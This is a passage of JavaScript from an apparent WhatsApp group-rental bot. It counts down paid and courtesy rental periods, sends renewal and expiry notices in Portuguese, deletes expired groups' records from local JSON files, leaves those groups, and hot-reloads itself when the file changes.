for(x of aluguel) {if(x.save != Number(moment.tz('America/Sao_Paulo').format('DD')) && x.cortesia == false) {
if(x.tempo > 1) {
if(Number(x.tempo) === 8 || Number(x.tempo) === 4 || Number(x.tempo) === 3 || Number(x.tempo) === 2) {
safeSendMessage(x.cliente, {text: `📢 Aviso importante!\nO contrato no grupo *${aluguel[aluguel.map(m => m.id).indexOf(x.id)].nome}* expira em ${Number(x.tempo) === 8 ? `1 semana (7 dias)` : Number(x.tempo) !== 2 ? `${x.tempo - 1} dias` : `24 horas (amanhã)`}.\n🔑 Para manter o acesso, é necessário renovar com nossa equipe.\n📞 Qualquer dúvida, contate meu proprietário.`})
}
x.save = Number(moment.tz('America/Sao_Paulo').format('DD'))
x.tempo -= 1
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
} else {
safeSendMessage(x.id, {text: `😿 *Contrato encerrado!*\nO tempo de aluguel do grupo chegou ao fim.\n\n👉 Para continuar, digite:  
*${prefix}compraraluguel 5 linkgrupo*\n\nApós o pagamento, finalize com:  
*${prefix}verificaraluguel*\ne volte a ter acesso imediato! 🚀`});
safeSendMessage(nmrdn, {text: `😿 O prazo do grupo *${x.nome}* encerrou!\nComo *@${x.cliente.split('@')[0]}* não renovou, saí do grupo e removi os registros. ✅`, mentions: [x.cliente]})
GP = grupos.map(i => i.id).indexOf(x.id)
grupos.splice(GP, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
RT = aluguel.map(i => i.id).indexOf(x.id)
grupo = x.id
aluguel.splice(RT, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
await sleep(4000)
client.groupLeave(grupo)
}}}}}

async function tmpCardCortesiaAluguel() {
if(aluguel.length > 0) {
for( x of aluguel ) {
if(x.save != Number(moment.tz('America/Sao_Paulo').format('HH')) && x.cortesia == true) {
if(x.tempo > 0) {
x.save = Number(moment.tz('America/Sao_Paulo').format('HH'))
x.tempo -= 1
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
} else {
safeSendMessage(x.id, {text: `😿 O cartão cortesia (24h) acabou no grupo!\nSe tiver interesse em continuar comigo, chame meu dono: *wa.me/${nmrdn.split('@')[0]}*`})
safeSendMessage(nmrdn, {text: `💳⏳ O período de cortesia do grupo *${x.nome}* terminou agora!\nVisto que não houve renovação, saí do grupo e removi os dados com segurança. 🔒`})
GP = grupos.map(i => i.id).indexOf(x.id)
grupos.splice(GP, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
aluguel.splice(aluguel.map(i => i.id).indexOf(x.id), 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
await sleep(4000)
client.groupLeave(x.id)
}}}}}

vipFunctionTempo(); // Executar a função do premium temporário, quando os dias zerar.
tmpCardAluguelFunction(); // Quando o aluguel oficial do grupo (assinado), sem ser o teste.
tmpCardCortesiaAluguel(); // Quando o cartão cortesia do grupo acabar, ele irá notificar.

msgupsrt()

}
}
}

//===== [Início - Área de Atualizações] =====\\
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(colors.red(`Alterações salvas - '${__filename}'`));
delete require.cache[file]
require(file)
})

//===== [Fim - Área de Atualizações] =====\\

iniciarClient().catch(async(e) => {return console.log(colors.red(`• ERROR: `+e))})